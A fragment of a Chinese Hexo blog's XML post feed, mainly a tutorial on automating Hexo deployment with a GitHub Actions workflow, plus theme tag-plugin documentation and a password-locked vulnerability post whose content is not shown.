data-href="#inlineimg-2">示例</button></li><li class="tab"><button type="button" data-href="#inlineimg-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="inlineimg-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inline<span class="emphasis">_img url [alt] [style] %&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="inlineimg-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>url</td><td>图片链接</td><td>无</td></tr><tr><td>alt</td><td>图片描述</td><td>无</td></tr><tr><td>style</td><td>图片样式</td><td>无</td></tr></tbody></table></div><div class="tab-item-content" id="inlineimg-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inline<span class="emphasis">_img &#x27;https://ui.everfu.cn/5e27069a26f95747442594647fc7d8b9.png/cover&#x27; &#x27;cover&#x27; &#x27;20px&#x27; %&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="inlineimg-3"><img src= "" data-lazy-src="https://ui.everfu.cn/5e27069a26f95747442594647fc7d8b9.png/cover" title="cover" height="20px" class="inline-img"></div></div></div><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Note 标签，用于显示提示。</p><div class="tabs" id="note"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#note-0">语法</button></li><li class="tab"><button type="button" data-href="#note-1">参数</button></li><li class="tab"><button type="button" data-href="#note-2">示例</button></li><li class="tab"><button type="button" data-href="#note-3">效果</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="note-0"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;type&#x27; &#x27;icon&#x27; %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="note-1"><table><thead><tr><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td>type</td><td>类型</td><td>无</td></tr><tr><td>icon</td><td>图标</td><td>无</td></tr></tbody></table><p>type: primary, success, warning, danger, info, modern, flat, simple<br>icon: fantawesome 图标（例如： fas fa-mail）</p></div><div class="tab-item-content" id="note-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;danger modern&#x27; &#x27;fas fa-wand-magic-sparkles&#x27; %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content" id="note-3"><div class="note danger modern"><i class="solitude fas fa-wand-magic-sparkles"></i><p>content</p></div></div></div></div><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> hexo solitude </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 外挂标签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Github Action实现全自动部署</title>
      <link href="/posts/41767f46.html"/>
      <url>/posts/41767f46.html</url>
      
        <content type="html"><![CDATA[<h2 id="Github-Action简介"><a href="#Github-Action简介" class="headerlink" title="Github Action简介"></a>Github Action简介</h2><p><a href="https://github.com/features/actions">Github Action</a>是 GitHub于2018年10月推出的一个CI\CD服务。  </p><p>CI&#x2F;CD解释</p><p>CI\CD 其实说的是三件事情：「持续集成（<code>Continuous Integration</code>）」、「持续交付（<code>Continuous Delivery</code>）」、「持续部署（<code>Continuous Deployment</code>）」。<br>因为「持续交付」和「持续部署」的英文缩写是一样的，所以这三件事情缩写成了 <code>CI\CD</code> 。</p><p>每次部署<code>Hexo</code>都需要运行指令三件套，随着文章越来越多，编译的时间也随之越来越长，通过<code>Github Action</code>，我们只需要在每次完成博客的编写或修改以后，将改动直接<code>push</code>到远程仓库，之后的编译部署的工作统统交给<code>CI</code>来完成即可，如果是看过<a href="https://akilar.top/posts/54c08a4b/">Coding部署教程</a>的小伙伴，应该对这种持续部署的操作有所感触。</p><h2 id="教程常量声明"><a href="#教程常量声明" class="headerlink" title="教程常量声明"></a>教程常量声明</h2><p>感谢<a href="https://menglei.xyz/">@YML</a>的反馈。以下将使用特定的常量名来指代一些名词。此处建议读者直接使用教程内容的常量名。在最后再逐一搜索替换。这样可以避免对各种常量名的混淆。</p><table><thead><tr><th>常量名</th><th>常量释义</th></tr></thead><tbody><tr><td><strong>[Blogroot]</strong></td><td>本地存放博客源码的文件夹路径</td></tr><tr><td><strong>[SourceRepo]</strong></td><td>存放博客源码的私有仓库名</td></tr><tr><td><strong>[SiteBlogRepo]</strong></td><td>存放编译好的博客页面的公有仓库名Site指站点，教程中会替换成Github、Gitee、Coding</td></tr><tr><td><strong>[SiteUsername]</strong></td><td>用户名  Site指站点，教程中会替换成  Github、Gitee、Coding</td></tr><tr><td><strong>[SiteToken]</strong></td><td>申请到的令牌码  Site指站点，教程中会替换成  Github、Gitee、Coding</td></tr><tr><td><strong>[GithubEmail]</strong></td><td>与github绑定的主邮箱，建议使用Gmail</td></tr><tr><td><strong>[TokenUser]</strong></td><td>Coding配置特有的令牌用户名</td></tr></tbody></table><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 在记事本中逐个记录，方便替换，以下为我的示例</span><br><span class="line"></span><br><span class="line">[Blogroot]：E:\Blogroot</span><br><span class="line"></span><br><span class="line">[SourceRepo]：Akilarlxh/Hexo-blog-source</span><br><span class="line"></span><br><span class="line">[SiteBlogRepo]</span><br><span class="line">  [GithubBlogRepo]：Akilarlxh.github.io</span><br><span class="line">  [GiteeBlogRepo]：akilar</span><br><span class="line">  [CodingBlogRepo]：akilar/akilar</span><br><span class="line"></span><br><span class="line">[SiteUsername]</span><br><span class="line">  [GithubUsername]：Akilarlxh</span><br><span class="line">  [GiteeUsername]：Akilar</span><br><span class="line">  [CodingUsername]：akilar</span><br><span class="line"></span><br><span class="line">[SiteToken]</span><br><span class="line">  [GithubToken]：15076c8eb9c874sad676bc9bfb13sadw86babf2</span><br><span class="line">  [GiteeToken]：f57acasdadgar4578603adas5d8w79bb</span><br><span class="line">  [CodingToken]：a4e45daf78as1f2670dcbbcfd5as7d8asd8cd66a77</span><br><span class="line"></span><br><span class="line">[GithubEmail]：akilarlxh@gmail.com</span><br><span class="line"></span><br><span class="line">[TokenUser]：RAxDiobbRi</span><br></pre></td></tr></table></figure><h2 id="Github-Action使用教程"><a href="#Github-Action使用教程" class="headerlink" title="Github Action使用教程"></a>Github Action使用教程</h2><h3 id="获取Token"><a href="#获取Token" class="headerlink" title="获取Token"></a>获取Token</h3><p>为了确保交由<code>Github Action</code>来持续部署时，<code>Github Action</code>具备足够的权限来进行<code>hexo deploy</code>操作,需要先获取<code>Token</code>，博主分别在<code>Github</code>、<code>Gitee</code>、<code>Coding</code>处部署了静态页面，所以也就需要获取这三处的<code>Token</code>。 </p><h4 id="github"><a href="#github" class="headerlink" title="github"></a>github</h4><p>访问<a href="https://github.com/login?return_to=https://github.com/settings/tokens">Github-&gt;头像（右上角）-&gt;Settings-&gt;Developer Settings-&gt;Personal access tokens</a>-&gt;generate new token,创建的Token名称随意，但必须勾选repo项和workflows项。<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/PISlRDgrsBXzcLK.png"><br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/ca384d58.png"><br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/20200923085908748.png"></p><h4 id="gitee"><a href="#gitee" class="headerlink" title="gitee"></a>gitee</h4><p>访问Gitee-&gt;<a href="https://gitee.com/profile/personal_access_tokens">头像（右上角）-&gt;设置-&gt;私人令牌</a>-&gt;生成新令牌<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/voHjeENlQOpFA6n.png"><br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/X6x8Tz9bgO7HNRP.png"></p><p>token只会显示这一次，之后将无法查看，所以务必保证你已经记录下了Token。之后如果忘记了就只能重新生成重新配置了。</p><h3 id="创建存放源码的私有仓库"><a href="#创建存放源码的私有仓库" class="headerlink" title="创建存放源码的私有仓库"></a>创建存放源码的私有仓库</h3><p>我们需要创建一个用来存放<code>Hexo</code>博客源码的私有仓库<code>[SourceRepo]</code>，这点在<a href="https://akilar.top/posts/6ef63e2d/">Win10</a>的<code>Hexo</code>博客搭建教程中有提到。为了保持教程的连贯，此处再写一遍。<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/PZ7wmiuX8ae9rVK.png"><br>创建完成后，需要把博客的源码<code>push</code>到这里。首先获取远程仓库地址，此处虽然<code>SSH</code>和<code>HTTPS</code>均可。<code>SSH</code>在绑定过<code>ssh key</code>的设备上无需再输入密码，<code>HTTPS</code>则需要输入密码，但是<code>SSH</code>偶尔会遇到端口占用的情况。请自主选择。<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/mpdUYJKcfWLQ2Eg.png"></p><p>这里之所以是私有仓库，是因为在接下来的配置中会用到<code>Token</code>，如果<code>Token</code>被盗用，别人可以肆意操作你的github仓库内容，为了避免这一风险，才选择的博客源码闭源。</p><h3 id="配置Github-Action"><a href="#配置Github-Action" class="headerlink" title="配置Github Action"></a>配置Github Action</h3><ol><li><p>在<code>[Blogroot]</code>新建<code>.github</code>文件夹,注意开头是有个<code>.</code>的。然后在<code>.github</code>内新建<code>workflows</code>文件夹，再在<code>workflows</code>文件夹内新建<code>autodeploy.yml</code>,在<code>[Blogroot]/.github/workflows/autodeploy.yml</code>里面输入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当有改动推送到master分支时，启动Action</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">自动部署</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">release:</span></span><br><span class="line">    <span class="attr">types:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">published</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">检查分支</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">ref:</span> <span class="string">master</span> <span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Node</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span> <span class="comment">#action使用的node版本，建议大版本和本地保持一致。可以在本地用node -v查询版本号。</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        export TZ=&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"><span class="string">        npm install hexo-cli -g</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">缓存</span> <span class="string">Hexo</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/cache@v1</span></span><br><span class="line">      <span class="attr">id:</span> <span class="string">cache</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">node_modules</span></span><br><span class="line">        <span class="attr">key:</span> <span class="string">$&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;**/package-lock.json&#x27;)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">安装依赖</span></span><br><span class="line">      <span class="attr">if:</span> <span class="string">steps.cache.outputs.cache-hit</span> <span class="type">!=</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        npm install --save</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">生成静态文件</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        hexo clean</span></span><br><span class="line"><span class="string">        hexo generate</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">部署</span> <span class="comment">#此处master:master 指从本地的master分支提交到远程仓库的master分支，若远程仓库没有对应分支则新建一个。如有其他需要，可以根据自己的需求更改。</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        cd ./public</span></span><br><span class="line"><span class="string">        git init</span></span><br><span class="line"><span class="string">        git config --global user.name &#x27;$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">        git config --global user.email &#x27;$&#123;&#123; secrets.GITHUBEMAIL &#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">        git add .</span></span><br><span class="line"><span class="string">        git commit -m &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; $(date +&quot;%Z %Y-%m-%d %A %H:%M:%S&quot;) Updated By Github Actions&quot;</span></span><br><span class="line"><span class="string">        git push --force --quiet &quot;https://$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;:$&#123;&#123; secrets.GITHUBTOKEN &#125;&#125;@github.com/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;/$&#123;&#123; secrets.GITHUBUSERNAME &#125;&#125;.github.io.git&quot; master:master</span></span><br><span class="line"><span class="string">        #git push --force --quiet &quot;https://$&#123;&#123; secrets.TOKENUSER &#125;&#125;:$&#123;&#123; secrets.CODINGTOKEN &#125;&#125;@e.coding.net/$&#123;&#123; secrets.CODINGUSERNAME &#125;&#125;/$&#123;&#123;  secrets.CODINGBLOGREPO &#125;&#125;.git&quot; master:master #coding部署写法，需要的自行取消注释</span></span><br><span class="line"><span class="string">        #git push --force --quiet &quot;https://$&#123;&#123; secrets.GITEEUSERNAME &#125;&#125;:$&#123;&#123; secrets.GITEETOKEN &#125;&#125;@gitee.com/$&#123;&#123; secrets.GITEEUSERNAME &#125;&#125;/$&#123;&#123; secrets.GITEEUSERNAME &#125;&#125;.git&quot; master:master #gitee部署写法，需要的自行取消注释</span></span><br></pre></td></tr></table></figure><p>注意最后一行的<code>master:master</code>指从本地的master分支提交到远程仓库的master分支,需要根据你自己的实际情况进行调整。本地分支可以在git bash中看到。线上分支可以在提交仓库中查看。因为“政治正确”的原因，github在2020年10月将默认分支改为main。而git软件在本地默认创建的分支依然是master，所以若你线上仓库默认分支是main，这里应该写成master:main，表示从本地的master推送到远程的main。</p></li><li><p>之后需要自己到仓库的Settings-&gt;Secrets-&gt;actions 下添加环境变量，变量名参考脚本中出现的，依次添加。<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/fdf9b9c9.png"><br>例如，需要部署在githubpage上，那么脚本中必要的变量为<br><code>GITHUBUSERNAME</code>、<code>GITHUBEMAIL</code>、<code>GITHUBTOKEN</code>，因此添加这三条变量。变量具体内容释义可以查看本文开头。<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/d1fc6570.png"></p></li></ol><h3 id="重新设置远程仓库和分支"><a href="#重新设置远程仓库和分支" class="headerlink" title="重新设置远程仓库和分支"></a>重新设置远程仓库和分支</h3><ol><li><p>删除或者先把<code>[Blogroot]/themes/butterfly/.git</code>移动到非博客文件夹目录下,原因是主题文件夹下的<code>.git</code>文件夹的存在会导致其被识别成子项目，从而无法被上传到源码仓库。</p></li><li><p>在博客根目录<code>[Blogroot]</code>路径下运行指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment">#初始化</span></span><br><span class="line">git remote add origin git@github.com:[GithubUsername]/[SourceRepo].git <span class="comment">#[SourceRepo]为存放源码的github私有仓库</span></span><br><span class="line">git checkout -b master <span class="comment"># 切换到master分支，</span></span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br><span class="line"><span class="comment"># 如果不是，后面的所有设置的分支记得保持一致</span></span><br></pre></td></tr></table></figure></li><li><p>添加屏蔽项<br>因为能够使用指令进行安装的内容不包括在需要提交的源码内，所有我们需要将这些内容添加到屏蔽项，表示不上传到github上。这样可以显著减少需要提交的文件量和加快提交速度。<br>打开<code>[Blogroot]/.gitignore</code>,输入以下内容：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.deploy_git*/</span><br><span class="line">.idea</span><br><span class="line">themes/butterfly/.git</span><br></pre></td></tr></table></figure><p>如果不是<code>butterfly</code>主题，记得替换最后一行内容为你自己当前使用的主题。</p></li><li><p>之后再运行git提交指令，将博客源码提交到github上。牢记下方的三行指令，以后都是通过这个指令进行提交。</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;github action update&quot;</span> <span class="comment">#引号内的内容可以自行更改作为提交记录。</span></span><br><span class="line">git push origin master</span><br><span class="line"><span class="comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span></span><br></pre></td></tr></table></figure><ol start="5"><li>此时你的主题文件夹若已经被正常上传，并且你也添加了主题文件夹下的.git文件夹的屏蔽项。那你可以考虑把第二步移走或删除的<code>.git</code>放回来，用作以后升级。（不禁怀疑真的有人会去用这个方式来升级吗）</li></ol><h3 id="查看部署情况"><a href="#查看部署情况" class="headerlink" title="查看部署情况"></a>查看部署情况</h3><p>此时，打开GIthub存放源码的私有仓库，找到action。<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/20200923095030252.png"><br>根据刚刚的Commit记录找到相应的任务<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/20200923095125814.png"><br>点击Deploy查看部署情况<br><img src= "" data-lazy-src="https://npm.elemecdn.com/akilar-candyassets/image/20200923095219663.png"><br>若全部打钩，恭喜你，你现在可以享受自动部署的快感了。</p><h3 id="可能遇到的bug"><a href="#可能遇到的bug" class="headerlink" title="可能遇到的bug"></a>可能遇到的bug</h3><p>最新教程已更新在提交至源码仓库章节前作为提示</p><h4 id="Unknown-block-tag-”tagname”"><a href="#Unknown-block-tag-”tagname”" class="headerlink" title="Unknown block tag:”tagname”"></a>Unknown block tag:”tagname”</h4><p>要是在github action部署时遇到<code>unknown block tag: &quot;tagname&quot;</code>这样的报错，说明你可能没有正确上传主题文件夹，也可能遇到安装依赖或生成页面失败的情况。</p><p>请按照以下思路逐一排查。</p><ol><li>是否将<code>node_modules</code>也上传到源码仓库<code>[SourceRepo]</code>了。源码仓库不需要有<code>node_modules</code>文件夹。</li><li>是否有将<code>[Blogroot]/themes/</code>下的主题文件夹上传，例如检查[SourceRepo]内的<code>[Blogroot]/themes/Butterfly</code>是否为空文件夹。为了能够正常编译页面，源码仓库需要有<code>[Blogroot]/themes/Butterfly</code>文件夹及它所包含的主题文件内容。<br>为了避免这两点，需要添加git屏蔽项。通过给<code>.gitignore</code>添加屏蔽项解决。<br>打开<code>[Blogroot]/.gitignore</code>,输入以下内容：</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">.deploy_git*/</span><br><span class="line">.idea</span><br><span class="line">themes/butterfly/.git</span><br></pre></td></tr></table></figure><ol start="3"><li>若是遇到添加屏蔽项，但是还是无法正常上传主题文件夹的情况。<ul><li>请先将本地源码中的<code>themes/butterfly</code>文件夹下的<code>.git</code>文件夹删除。</li><li>然后将<code>butterfly</code>文件夹移动到别的目录下。然后<code>commit</code>一次。</li><li>接着将<code>butterfly</code>文件夹移动回来，再<code>commit</code>一次。</li></ul></li></ol><h4 id="变量名称问题"><a href="#变量名称问题" class="headerlink" title="变量名称问题"></a>变量名称问题</h4><p>部分不愿意用教程给出的变量名的可能遇到未知bug，此处给出官方的命名规则：</p><p>以下规则适用于密码名称：</p><p>密钥名称只能包含字母数字字符（[a-z]、[A-Z]、[0-9]）或下划线 (_)。 不允许空格。</p><p>密钥名称不得以 GITHUB_ 前缀开头。</p><p>密钥名称不能以数字开头。</p><p>密钥名称不区分大小写。</p><p>密钥名称在所创建的级别上必须是唯一的。</p><h4 id="spawn-failed"><a href="#spawn-failed" class="headerlink" title="spawn failed"></a>spawn failed</h4><p>若是遇到spawn failed报错。在github action的配置中出现这一报错。一般是因为涉及到部署地址的配置项有误。</p><p>首先排查你在[Blogroot]_config.yml的deploy配置项是否按照上文配置deploy项中的步骤正确组装配置链接。<br>其次排查[Blogroot].github\workflows\autodeploy.yml中各个关于仓库链接的配置内容，注意按照注释指引检查空格、分支等。<br>更多可能的因素和解决方案可以参考@洪哥HEO写的方案:Hexo错误：spawn failed的解决方法。</p><h4 id="分支问题"><a href="#分支问题" class="headerlink" title="分支问题"></a>分支问题</h4><p>本地分支和线上分支不一致导致总是提交不上。<br>注意观察autodeploy.yml文件中，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --force --quiet <span class="string">&quot;https://<span class="variable">$&#123;&#123; secrets.GITHUBUSERNAME &#125;</span>&#125;:<span class="variable">$&#123;&#123; secrets.GITHUBTOKEN &#125;</span>&#125;@github.com/<span class="variable">$&#123;&#123; secrets.GITHUBUSERNAME &#125;</span>&#125;/<span class="variable">$&#123;&#123; secrets.GITHUBUSERNAME &#125;</span>&#125;.github.io.git&quot;</span> master:master</span><br></pre></td></tr></table></figure><p>末尾的master:master指从本地的master分支提交到远程仓库的master分支。需要根据实际情况进行调整。本地的分支可在git bash中查看。线上的分支可在仓库查看。比如本地默认分支是master，线上默认分支是main，应该改成master:main。<br>会遇到这类问题，一般是有同学直接全局替换master为main导致。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这里可能有同学要问，github action有啥用？这不就是从<code>hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</code>的三件套变成了<code>git add .</code>,<code>git commit -m &quot;commit content&quot;</code>,<code>git push</code>三件套吗？<br>其实github action的最大作用就是进一步提高速度和便携性，首先，配置要求提交源码这点，萌新小白就没必要再靠本地不断新建压缩包来备份源码了，借助git的版本管理，不管怎么改都可以快速回滚。<br>然后，git提交是增量更新，每次只提交新增或者删改的内容，而hexo deploy是在本地每次重新生成所有静态文件以后再整个提交。github action能帮我们节省大把时间，把最耗时的hexo generate和hexo deploy的工作丢给CI处理。让我们能够专心与编写博客内容，而不是水文3分钟，提交半小时。</p><h3 id="发散思维"><a href="#发散思维" class="headerlink" title="发散思维"></a><a href="https://akilar.top/posts/f752c86d/#%E5%8F%91%E6%95%A3%E6%80%9D%E7%BB%B4" title="发散思维"></a>发散思维</h3><p><code>Github action</code>只要监测到<code>master</code>分支有所变动就会启动部署，那么顺着这个思路，手机用户可以在网页Github进行小幅修改，例如修改错别字，调整布局之类的。保存后也会启动<code>Github action</code>，从而将内容部署到网页上去。</p><p>2020年10月后<code>github</code>新建仓库默认分支改为<code>main</code>，注意更改</p><h2 id="拓展内容"><a href="#拓展内容" class="headerlink" title="拓展内容"></a>拓展内容</h2><ol><li><a href="https://akilar.top/posts/812734f8/">使用Vercel来加速Hexo博客</a></li><li><a href="https://akilar.top/posts/54c08a4b/">使用Coding和github来实现双线部署</a></li><li><a href="https://akilar.top/posts/6ff8c001/">使用Gitee提供镜像站支持</a></li></ol><p>原创使用Github Action实现全自动部署</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于海康威视部分版本漏洞</title>
      <link href="/posts/af9e54a7.html"/>
      <url>/posts/af9e54a7.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="ab3fd65330b2979ffbb13dddf8ae16dc5fd817bbc96d1dcd0bde90e9ff126715"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作记录</title>
      <link href="/posts/c636442c.html"/>
      <url>/posts/c636442c.html</url>
      
